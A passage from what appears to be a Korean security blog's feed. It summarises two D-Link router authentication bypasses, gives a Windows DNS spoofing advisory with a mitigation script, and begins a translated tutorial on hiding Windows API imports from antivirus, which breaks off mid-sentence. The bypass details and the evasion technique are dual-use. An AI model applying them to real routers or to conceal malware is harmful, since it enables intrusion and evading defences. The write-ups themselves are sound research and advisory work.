    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.zerodayinitiative.com/blog/2020/9/30/the-anatomy-of-a-bug-door-dissecting-two-d-link-router-authentication-bypasses">THE ANATOMY OF A BUG DOOR: DISSECTING TWO D-LINK ROUTER AUTHENTICATION BYPASSES</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>D-LINK router</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>HNAP (Home Network Administration Protocol)&#xB294; Pure Networks Inc. &#xC5D0;&#xC11C; &#xAC1C;&#xBC1C; &#xD55C; &#xB3C5;&#xC810; SOAP &#xAE30;&#xBC18; &#xD504;&#xB85C;&#xD1A0;&#xCF5C;&#xC785;&#xB2C8;&#xB2E4;. &#xD604;&#xC7AC;&#xB294; &#xC774; &#xD504;&#xB85C;&#xD1A0;&#xCF5C;&#xC758; &#xC0AC;&#xC6A9;&#xC774; &#xC911;&#xB2E8;&#xB418;&#xC5C8;&#xC9C0;&#xB9CC; &#xC5EC;&#xC804;&#xD788; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xB9CE;&#xC740; &#xB77C;&#xC6B0;&#xD130;&#xB4E4;&#xC774; &#xD574;&#xB2F9; &#xD504;&#xB85C;&#xD1A0;&#xCF5C;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>HNAP&#xC5D0;&#xC11C; &#xBC1C;&#xACAC;&#xB41C; &#xB450; &#xAC00;&#xC9C0; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>CVE-2020-8863&#xC740; <code>LoginPassword</code> &#xAC80;&#xC99D; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD558;&#xB294; authentication bypass &#xCDE8;&#xC57D;&#xC810;&#xC785;&#xB2C8;&#xB2E4;. <code>strncmp()</code> &#xC5D0;&#xC11C; db &#xD328;&#xC2A4;&#xC6CC;&#xB4DC;&#xC640; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xAC00; &#xC785;&#xB825;&#xD55C; <code>LoginPassword</code>&#xB97C; <code>LoginPassword</code>&#xC758; size &#xB9CC;&#xD07C; &#xBE44;&#xAD50;&#xD558;&#xB294;&#xB370;, &#xC774;&#xB54C; <code>LoginPassword</code>&#xC5D0; &#xBE48; &#xAC12;&#xC744; &#xC804;&#xB2EC;&#xD558;&#xBA74; &#xBE44;&#xAD50;&#xD560; size&#xAC00; 0&#xC774; &#xB418;&#xC5B4; &#xBB34;&#xC870;&#xAC74; &#xC778;&#xC99D;&#xC5D0; &#xC131;&#xACF5;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><p>CVE-2020-8864&#xB294; HNAP PrivateLogin &#xC778;&#xC99D; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC758; &#xC798;&#xBABB;&#xB41C; &#xAD6C;&#xD604;&#xC73C;&#xB85C; &#xC778;&#xD574; &#xBC1C;&#xC0DD;&#xD558;&#xB294; authentication bypass &#xCDE8;&#xC57D;&#xC810;&#xC785;&#xB2C8;&#xB2E4;. HNAP&#xB97C; &#xD1B5;&#xD574; &#xC778;&#xC99D;&#xD560; &#xB54C; &#xC11C;&#xBC84;&#xB294; &#xC77C;&#xBC18;&#xC801;&#xC73C;&#xB85C; Private key&#xB97C; &#xC0AC;&#xC6A9;&#xC790;&#xC758; &#xC554;&#xD638;&#xB97C; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7EC;&#xB098; &#xB85C;&#xADF8;&#xC778; &#xC694;&#xCCAD; &#xC911; <code>PrivateLogin</code> &#xD544;&#xB4DC;&#xC5D0; &#x201C;Username&#x201D; &#xAC12;&#xC744; &#xB123;&#xC5B4; &#xC694;&#xCCAD;&#xD558;&#xBA74; &#x201C;Username&#x201D;&#xAC12;&#xC73C;&#xB85C; Private key&#xB97C; &#xC0DD;&#xC131;&#xD574;  &#xC2E4;&#xC81C; &#xAD00;&#xB9AC;&#xC790; &#xC554;&#xD638;&#xB97C; &#xBAB0;&#xB77C;&#xB3C4; &#xC778;&#xC99D; &#xCC4C;&#xB9B0;&#xC9C0; &#xAC12;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>d-link</tag>
      
      <tag>authentication bypass</tag>
      
      <tag>router</tag>
      
      <tag>L0ch</tag>
      
      <tag>bug-door</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Windows Server DNS Resolver Spoofing 취약점 권고</title>
    <link href="/2020/12/14/idioth/2020-12-14/"/>
    <url>/2020/12/14/idioth/2020-12-14/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://dirteam.com/sander/2020/12/10/dns-spoofing-vulnerability-sad-dns-important-cve-2020-25705-adv200013/">Spoofing Vulnerability in DNS Resolver (SAD DNS, Important, CVE-2020-25705, ADV200013)</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows Server 2008 R2</li><li>Windows Server 2012</li><li>Windows Server 2012 R2</li><li>Windows Server 2016</li><li>Windows Server 2019</li><li>Windows Server, version 1903</li><li>Windows Server, version 1909</li><li>Windows Server, version 2004</li><li>Windows Server, version 20H2</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>2020&#xB144; 12&#xC6D4; 8&#xC77C;&#xC5D0; &#xB9C8;&#xC774;&#xD06C;&#xB85C;&#xC18C;&#xD504;&#xD2B8;&#xC5D0;&#xC11C; DNS Resolver addressing spoofing &#xCDE8;&#xC57D;&#xC810;&#xC5D0; &#xB300;&#xD55C; &#xBCF4;&#xC548; &#xACF5;&#xC9C0;(<a href="https://msrc.microsoft.com/update-guide/vulnerability/ADV200013">ADV200013</a>)&#xAC00; &#xBC1C;&#xD45C;&#xB410;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB9C8;&#xC774;&#xD06C;&#xB85C;&#xC18C;&#xD504;&#xD2B8;&#xB294; &#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD1B5;&#xD55C; DNS cache poisoning attack&#xC744; &#xB9C9;&#xAE30; &#xC704;&#xD574; DNS UDP &#xD328;&#xD0B7;&#xC758; &#xD06C;&#xAE30;&#xB97C; &#xC81C;&#xD55C;&#xD558;&#xB294; &#xAD8C;&#xACE0;&#xB97C; &#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; Windows TCP/IP stack&#xC5D0; &#xC81C;&#xACF5;&#xB418;&#xB294; DNS Resolver Component&#xC5D0; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;. DNS Resolver&#xC5D0; &#xC601;&#xD5A5;&#xC744; &#xBBF8;&#xCE58;&#xB294; IP &#xC870;&#xAC01;&#xD654;&#xC5D0; &#xC758;&#xD574; DNS cache poisoning &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD558;&#xBA70; &#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC744; exploit &#xD55C; &#xD574;&#xCEE4;&#xB294; DNS forwarder&#xB098; DNS Resolver&#xC5D0; &#xC758;&#xD574; cache &#xB41C; DNS packet&#xC744; &#xC2A4;&#xD478;&#xD551; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC131;&#xACF5;&#xC801;&#xC73C;&#xB85C; exploit &#xD558;&#xBA74; &#xD574;&#xCEE4;&#xB294; &#xC218;&#xC815;&#xB41C; DNS record&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xD574;&#xCEE4;&#xC758; &#xC6F9;&#xC0AC;&#xC774;&#xD2B8;&#xB85C; redirect &#xC2DC;&#xD0AC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xBC29;&#xC9C0;&#xD558;&#xAE30; &#xC704;&#xD574; <code>MaximumUdpPacketSize</code> &#xB808;&#xC9C0;&#xC2A4;&#xD2B8;&#xB9AC; &#xAC12;&#xC744; 1,221 bytes&#xB85C; &#xC218;&#xC815;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. &#xC218;&#xC815;&#xB41C; &#xD6C4; DNS Resolver&#xB294; 1,221 bytes&#xBCF4;&#xB2E4; &#xD070; &#xBAA8;&#xB4E0; response&#xB97C; TCP&#xB85C; &#xBC1B;&#xC544;&#xC11C; Windows Server &#xAE30;&#xBC18; DNS server&#xC5D0;&#xC11C; &#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC545;&#xC6A9;&#xD558;&#xB824;&#xB294; &#xC2DC;&#xB3C4;&#xB97C; &#xB9C9;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>DNS server&#xAC00; &#xC2E4;&#xD589;&#xB418;&#xB294; &#xBAA8;&#xB4E0; Windows Server&#xC5D0;&#xC11C; &#xAD00;&#xB9AC;&#xC790; &#xAD8C;&#xD55C; &#xD30C;&#xC6CC; &#xC258;&#xC774;&#xB098; &#xC6D0;&#xACA9; &#xC138;&#xC158;&#xC744; &#xD1B5;&#xD55C; &#xC544;&#xB798;&#xC758; &#xBA85;&#xB839;&#xC904;&#xC744; &#xC2E4;&#xD589;&#xD558;&#xBA74; UDP &#xD328;&#xD0B7; &#xD06C;&#xAE30;&#xC758; &#xB808;&#xC9C0;&#xC2A4;&#xD2B8;&#xB9AC; &#xAC12;&#xC744; &#xBCC0;&#xACBD;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs powershell"><span class="hljs-variable">$RegPath</span> = <span class="hljs-string">&quot;HKLM:\System\CurrentControlSet\Services\DNS\Parameters&quot;</span><span class="hljs-built_in">New-ItemProperty</span> <span class="hljs-literal">-Path</span> <span class="hljs-variable">$RegPath</span> <span class="hljs-literal">-Name</span> MaximumUdpPacketSize `<span class="hljs-literal">-Value</span> <span class="hljs-number">1221</span> <span class="hljs-literal">-PropertyType</span> DWORD <span class="hljs-literal">-Force</span><span class="hljs-built_in">Restart-Service</span> DNS</code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows server</tag>
      
      <tag>idioth</tag>
      
      <tag>sad dns</tag>
      
      <tag>dns cache poisoning</tag>
      
      <tag>dns resolver</tag>
      
      <tag>adv200013</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Translation] Engineering Antivirus evasion Part.2</title>
    <link href="/2020/12/13/idioth/av_evasion_part2/"/>
    <url>/2020/12/13/idioth/av_evasion_part2/</url>
    
    <content type="html"><![CDATA[<p>&#xC800;&#xBC88;&#xC5D0; &#xC62C;&#xB838;&#xB358; Engineering Antivirus evasion&#xB97C; &#xC774;&#xC5B4;&#xC11C; Part 2&#xC758; &#xBC88;&#xC5ED;&#xBCF8;&#xB3C4; &#xB4E4;&#xACE0; &#xC654;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC800;&#xBC88;&#xC758; &#xBC1C; &#xBC88;&#xC5ED;&#xC5D0; &#xC774;&#xC5B4;&#xC11C; &#xC774;&#xBC88;&#xC5D0;&#xB3C4; &#xC758;&#xC5ED;&#xACFC; &#xC624;&#xC5ED;&#xC774; &#xB09C;&#xBB34;&#xD558;&#xB294; &#xAE00;&#xC774;&#xBBC0;&#xB85C; &#xAE00;&#xC774; &#xC774;&#xD574;&#xAC00; &#xC548; &#xB418;&#xC2DC;&#xAC70;&#xB098; &#xC598;&#xAC00; &#xC65C; &#xC774;&#xB807;&#xAC8C; &#xC37C;&#xB294;&#xC9C0; &#xC774;&#xD574;&#xAC00; &#xC548; &#xB418;&#xC2DC;&#xB294; &#xBD80;&#xBD84;&#xC774; &#xC788;&#xC73C;&#xC2DC;&#xBA74; &#xBC14;&#xB85C; &#xC9C0;&#xC801;&#xD574;&#xC8FC;&#xC2DC;&#xAE30; &#xBC14;&#xB78D;&#xB2C8;&#xB2E4;!</p><blockquote><p>&#xC6D0;&#xBB38;&#xAE00; : <a href="https://blog.scrt.ch/2020/07/15/engineering-antivirus-evasion-part-ii/">Engineering antivirus evasion (Part II)</a></p></blockquote><p><strong>tl;dr</strong> &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4;&#xB294; Windows &#xC6B4;&#xC601; &#xCCB4;&#xC81C;&#xC640; &#xC0C1;&#xD638; &#xC791;&#xC6A9;&#xD558;&#xAE30; &#xC704;&#xD574; &#xB3D9;&#xC801; &#xB9C1;&#xD06C; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;(DLL)&#xB97C; &#xD1B5;&#xD574; &#xD568;&#xC218;&#xB97C; &#xAC00;&#xC838;&#xC628;&#xB2E4;. &#xC774; &#xD568;&#xC218;&#xB4E4;&#xC740; Import Address Table &#xD14C;&#xC774;&#xBE14;&#xC5D0; &#xD3C9;&#xBB38;&#xC73C;&#xB85C; &#xC791;&#xC131;&#xB418;&#xACE0; &#xC548;&#xD2F0;&#xBC14;&#xC774;&#xB7EC;&#xC2A4; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4;&#xB294; &#xC774;&#xB97C; &#xD65C;&#xC6A9;&#xD558;&#xC5EC; &#xC545;&#xC758;&#xC801;&#xC778; &#xD65C;&#xB3D9;&#xC744; &#xD0D0;&#xC9C0;&#xD55C;&#xB2E4;. &#xC6B0;&#xB9AC;&#xB294; Meterpreter&#xB97C; &#xC911;&#xC2EC;&#xC73C;&#xB85C; C/C++ &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4;&#xB97C; refactoring &#xD558;&#xC5EC; &#xC774;&#xB7EC;&#xD55C; footprint&#xB97C; &#xC81C;&#xAC70;&#xD560; &#xC218; &#xC788;&#xB294; &#xB09C;&#xB3C5;&#xD654; &#xC544;&#xC774;&#xB514;&#xC5B4;&#xC640; &#xAD6C;&#xD604;&#xC744; &#xBCF4;&#xC5EC;&#xC900;&#xB2E4;. &#xC18C;&#xC2A4; &#xCF54;&#xB4DC;&#xB294; <a href="https://github.com/scrt/avcleaner">https://github.com/scrt/avcleaner</a>&#xC5D0;&#xC11C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xB2E4;.</p><h2 id="&#xC18C;&#xAC1C;"><a href="#&#xC18C;&#xAC1C;" class="headerlink" title="&#xC18C;&#xAC1C;"></a>&#xC18C;&#xAC1C;</h2><p>&#xC774;&#xC804; &#xAE00;&#xC5D0;&#xC11C; &#xC815;&#xADDC;&#xC2DD;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC9C0; &#xC54A;&#xACE0; &#xC18C;&#xC2A4; &#xCF54;&#xB4DC;&#xC5D0;&#xC11C; &#xBB38;&#xC790;&#xC5F4; &#xB9AC;&#xD130;&#xB7F4;&#xC744; &#xBC14;&#xAFB8;&#xB294; &#xBC29;&#xBC95;&#xC744; &#xBCF4;&#xC5EC;&#xC92C;&#xB2E4;. &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xC758; footprint&#xB97C; &#xC904;&#xC774;&#xACE0; &#xC815;&#xC801; &#xC2DC;&#xADF8;&#xB2C8;&#xCC98;&#xC5D0; &#xC758;&#xC874;&#xD558;&#xB294; &#xBCF4;&#xC548; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4;&#xB97C; &#xC6B0;&#xD68C;&#xD558;&#xB294; &#xAC83;&#xC774; &#xBAA9;&#xC801;&#xC774;&#xB2E4;.</p><p>&#xADF8;&#xB7EC;&#xB098; &#xC18C;&#xC2A4; &#xCF54;&#xB4DC;&#xC758; &#xBB38;&#xC790;&#xC5F4; &#xB9AC;&#xD130;&#xB7F4; &#xB9D0;&#xACE0;&#xB3C4; &#xC815;&#xC801;&#xC73C;&#xB85C; &#xC218;&#xC9D1;&#xD558;&#xACE0; &#xBD84;&#xC11D;&#xD560; &#xC218; &#xC788;&#xB294; &#xC815;&#xBCF4;&#xB4E4;&#xC774; &#xB9CE;&#xB2E4;. &#xC774; &#xAE00;&#xC740; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xC5D0;&#xC11C; API import&#xB97C; &#xC228;&#xAE30;&#xB294; &#xBC29;&#xBC95;&#xACFC; C/C++&#xB85C; &#xC791;&#xC131;&#xB41C; &#xBAA8;&#xB4E0; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4;&#xC5D0;&#xC11C; &#xADF8; &#xC791;&#xC5C5;&#xC744; &#xC790;&#xB3D9;&#xD654;&#xD558;&#xB294; &#xBC29;&#xBC95;&#xC5D0; &#xB300;&#xD574;&#xC11C; &#xB2E4;&#xB8F0; &#xAC83;&#xC774;&#xB2E4;.</p><h2 id="API-imports&#xC758;-&#xBB38;&#xC81C;&#xC810;"><a href="#API-imports&#xC758;-&#xBB38;&#xC81C;&#xC810;" class="headerlink" title="API imports&#xC758; &#xBB38;&#xC81C;&#xC810;"></a>API imports&#xC758; &#xBB38;&#xC81C;&#xC810;</h2><p>&#xAC04;&#xB2E8;&#xD55C; C &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC744; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; &#xC791;&#xC131;&#xD558;&#xACE0; &#xBE4C;&#xB4DC;&#xD558;&#xC790;</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>** argv)</span> </span>{     MessageBox(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;Test&quot;</span>, <span class="hljs-string">&quot;Something&quot;</span>, MB_OK);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre><p>&#xADF8;&#xB9AC;&#xACE0; &#xAC00;&#xC7A5; &#xC88B;&#xC544;&#xD558;&#xB294; &#xCEF4;&#xD30C;&#xC77C;&#xB7EC;&#xB85C; &#xBE4C;&#xB4DC;&#xD574;&#xB77C;. MinGW&#xB294; <em>macOS</em>&#xC5D0;&#xC11C; <em>Windows</em>&#xB85C; &#xD06C;&#xB85C;&#xC2A4; &#xBE4C;&#xB4DC;&#xB97C; &#xD558;&#xB294; &#xB370; &#xC0AC;&#xC6A9;&#xB41C;&#xB2E4;.</p><pre><code class="hljs bash">x86_64-w64-mingw32-gcc test.c -o /tmp/toto.exe</code></pre><p>&#xADF8; &#xD6C4;&#xC5D0; rabin2(radare2&#xC5D0; &#xD3EC;&#xD568;&#xB418;&#xC5B4; &#xC788;&#xC74C;) &#xB610;&#xB294; GNU strings &#xC720;&#xD2F8;&#xB9AC;&#xD2F0;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xBB38;&#xC790;&#xC5F4;&#xC744; &#xB9AC;&#xC2A4;&#xD2B8; &#xD560; &#xC218; &#xC788;&#xB2E4;.</p><pre><code class="hljs bash">rabin2 -zz /tmp/toto.exe | bat</code></pre><pre><code class="hljs bash"> 205   &#x2502; 201  0x00003c92 0x00408692 7   8    .idata        ascii   strncmp 206   &#x2502; 202  0x00003c9c 0x0040869c 8   9    .idata        ascii   vfprintf 207   &#x2502; 203  0x00003ca8 0x004086a8 11  12   .idata        ascii   MessageBoxA 208   &#x2502; 204  0x00003d10 0x00408710 12  13   .idata        ascii   KERNEL32.dll 209   &#x2502; 205  0x00003d84 0x00408784 10  11   .idata        ascii   msvcrt.dll 210   &#x2502; 206  0x00003d94 0x00408794 10  11   .idata        ascii   USER32.dll...9557   &#x2502; 9553 0x0004f481 0x00458e81 30  31                 ascii   .refptr.__native_startup_state9558   &#x2502; 9554 0x0004f4a0 0x00458ea0 11  12                 ascii   __ImageBase9559   &#x2502; 9555 0x0004f4ac 0x00458eac 11  12                 ascii   MessageBoxA9560   &#x2502; 9556 0x0004f4b8 0x00458eb8 12  13                 ascii   GetLastError9561   &#x2502; 9557 0x0004f4c5 0x00458ec5 17  18                 ascii   __imp_MessageBoxA9562   &#x2502; 9558 0x0004f4d7 0x00458ed7 23  24                 ascii   GetSystemTimeAsFileTime9563   &#x2502; 9559 0x0004f4ef 0x00458eef 22  23                 ascii   mingw_initltssuo_force9564   &#x2502; 9560 0x0004f506 0x00458f06 19  20                 ascii   __rt_psrelocs_start</code></pre><p>&#xC774; &#xD568;&#xC218;&#xB97C; <code>User32.dll</code> &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xC5D0;&#xC11C; &#xAC00;&#xC838;&#xC640;&#xC57C; &#xD558;&#xBBC0;&#xB85C; MessageBoxA &#xBB38;&#xC790;&#xC5F4;&#xC740; 3&#xBC88; &#xB098;&#xD0C0;&#xB09C;&#xB2E4;.(&#xB4A4;&#xC5D0;&#xC11C; &#xC790;&#xC138;&#xD788; &#xC124;&#xBA85;)</p><p>MessageBoxA &#xBB38;&#xC790;&#xC5F4;&#xC740; &#xC548;&#xD2F0;&#xBC14;&#xC774;&#xB7EC;&#xC2A4;&#xC5D0;&#xC11C; &#xAC10;&#xC9C0;&#xB418;&#xC9C0; &#xC54A;&#xC9C0;&#xB9CC; &#xB2E4;&#xC74C; API&#xB4E4;&#xC740; &#xAC10;&#xC9C0;&#xB420; &#xAC83;&#xC774;&#xB2E4;.</p><ul><li>InternetReadFile</li><li>ShellExecute</li><li>CreateRemoteThread</li><li>OpenProcess</li><li>ReadProcessMemory</li><li>WriteProcessMemory</li><li>&#x2026;</li></ul><h2 id="API-imports-&#xC228;&#xAE30;&#xAE30;"><a href="#API-imports-&#xC228;&#xAE30;&#xAE30;" class="headerlink" title="API imports &#xC228;&#xAE30;&#xAE30;"></a>API imports &#xC228;&#xAE30;&#xAE30;</h2><p>&#xC708;&#xB3C4;&#xC6B0; &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0;&#xC11C; &#xAC1C;&#xBC1C;&#xC790;&#xB4E4;&#xC774; &#xC678;&#xBD80; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC; &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xB294; &#xB370; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xB294; &#xBC29;&#xBC95;&#xB4E4;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xB2E4;.</p><ul><li>Load-time dynamic linking</li><li>Run-time dynamic linking</li></ul><h3 id="Load-time-dynamic-linking"><a href="#Load-time-dynamic-linking" class="headerlink" title="Load-time dynamic linking"></a>Load-time dynamic linking</h3><p>&#xC678;&#xBD80; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC; &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xB294; &#xAE30;&#xBCF8;&#xC801;&#xC778; &#xBC29;&#xBC95;&#xC774;&#xBA70; &#xB9C1;&#xCEE4;&#xC5D0; &#xC758;&#xD574; &#xC790;&#xB3D9;&#xC801;&#xC73C;&#xB85C; &#xCC98;&#xB9AC;&#xB41C;&#xB2E4;. &#xBE4C;&#xB4DC; &#xC0AC;&#xC774;&#xD074; &#xB3D9;&#xC548; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC740; &#xAC01; &#xB3D9;&#xC801; &#xB9C1;&#xD06C; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;(DLL)&#xC758; import library(.lib)&#xC5D0; &#xC5F0;&#xACB0;&#xB41C;&#xB2E4;. &#xAC00;&#xC838;&#xC628; &#xAC01; &#xD568;&#xC218;&#xC5D0; &#xB300;&#xD574; &#xB9C1;&#xCEE4;&#xB294; DLL&#xC5D0; &#xB300;&#xD55C; &#xB0B4;&#xC6A9;&#xC744; IAT&#xC5D0; &#xC5D4;&#xD2B8;&#xB9AC;&#xB97C; &#xC791;&#xC131;&#xD55C;&#xB2E4;.</p><p>&#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC774; &#xC2DC;&#xC791;&#xB420; &#xB54C;, &#xC6B4;&#xC601;&#xCCB4;&#xC81C;&#xB294; IAT&#xB97C; &#xD0D0;&#xC0C9;&#xD558;&#xC5EC; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; &#xC8FC;&#xC18C; &#xACF5;&#xAC04;&#xC5D0; &#xC788;&#xB294; &#xBAA8;&#xB4E0; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC; &#xB9AC;&#xC2A4;&#xD2B8;&#xB97C; &#xB9E4;&#xD551;&#xD558;&#xACE0; &#xAC00;&#xC838;&#xC628; &#xAC01; &#xD568;&#xC218;&#xC758; &#xC8FC;&#xC18C;&#xB294; DLL&#xC758; Export Address Table&#xC5D0; &#xD574;&#xB2F9; &#xC5D4;&#xD2B8;&#xB9AC;&#xB97C; &#xAC00;&#xB9AC;&#xD0A4;&#xB3C4;&#xB85D; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xB41C;&#xB2E4;.</p><p><img src="/2020/12/13/idioth/av_evasion_part2/0.png" alt></p><p>Import Address Table (IAT)</p><h3 id="Run-time-dynamic-linking"><a href="#Run-time-dynamic-linking" class="headerlink" title="Run-time dynamic linking"></a>Run-time dynamic linking</h3><p>&#xB2E4;&#xB978; &#xBC29;&#xBC95;&#xC740; LoadLibrary&#xB85C; &#xD574;&#xB2F9; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xB97C; &#xB85C;&#xB4DC;&#xD55C; &#xD6C4; GetProcAddress&#xB85C; &#xD568;&#xC218;&#xC758; &#xC8FC;&#xC18C;&#xB97C; &#xC5BB;&#xC5B4; &#xC218;&#xB3D9;&#xC801;&#xC73C;&#xB85C; &#xC218;&#xD589;&#xD558;&#xB294; &#xAC83;&#xC774;&#xB2E4;. &#xC608;&#xB97C; &#xB4E4;&#xC5B4; &#xC704;&#xC758; &#xC608;&#xC2DC;&#xB97C; run-time dynamic linking&#xC744; &#xC801;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xB2E4;.</p><p>&#xBA3C;&#xC800; MessageBoxA API&#xC758; &#xD568;&#xC218; &#xD3EC;&#xC778;&#xD130;&#xB97C; &#xC815;&#xC758;&#xD574;&#xC57C; &#xD55C;&#xB2E4;. &#xC2DC;&#xC791;&#xD558;&#xAE30; &#xC804;&#xC5D0; C&#xC758; &#xD568;&#xC218; &#xD3EC;&#xC778;&#xD130; &#xAD6C;&#xBB38;&#xC5D0; &#xB300;&#xD574; &#xAC04;&#xB2E8;&#xD558;&#xAC8C; &#xC124;&#xBA85;&#xD55C;&#xB2E4;.</p><pre><code class="hljs cpp">&lt;<span class="hljs-keyword">return</span> type&gt; (*&lt;your pointer name&gt;)(arg1, arg2, ...);</code></pre><p>&#xBCFC; &#xC218; &#xC788;&#xB4EF;&#xC774; star operator(&#xD568;&#xC218; &#xD3EC;&#xC778;&#xD130;&#xC774;&#xBBC0;&#xB85C;)&#xC640;  &#xAD04;&#xD638;&#xB97C; &#xC81C;&#xC678;&#xD558;&#xBA74; &#xD568;&#xC218;&#xB97C; &#xC815;&#xC758;&#xD558;&#xB294; &#xAD6C;&#xBB38;&#xACFC; &#xAC19;&#xB2E4;.</p><p>&#xC774;&#xC81C; MessageBox&#xC758; &#xD504;&#xB85C;&#xD1A0;&#xD0C0;&#xC785;&#xC774; &#xD544;&#xC694;&#xD55C;&#xB370; Windows SDK&#xC758; <code>winuser.h</code> &#xD639;&#xC740; <a href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-messagebox">MSDN</a>&#xC5D0;&#xC11C; &#xCC3E;&#xC744; &#xC218; &#xC788;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">MessageBox</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">  HWND    hWnd,</span></span><span class="hljs-function"><span class="hljs-params">  LPCTSTR lpText,</span></span><span class="hljs-function"><span class="hljs-params">  LPCTSTR lpCaption,</span></span><span class="hljs-function"><span class="hljs-params">  UINT    uType</span></span><span class="hljs-function"><span class="hljs-params">)</span></span>;</code></pre><p>&#xC55E;&#xC11C; &#xB9D0;&#xD55C; &#xD568;&#xC218; &#xD3EC;&#xC778;&#xD130; &#xAD6C;&#xBB38;&#xC740; &#xC815;&#xD655;&#xD55C; &#xC815;&#xBCF4;&#xB85C; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xD560; &#xC218; &#xC788;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-keyword">int</span> (*_MessageBoxA)(    HWND hWnd,    LPCTSTR lpText,    LPCTSTR lpCaption,    UINT uType);</code></pre><p>MSDN&#xC740; &#xC774; 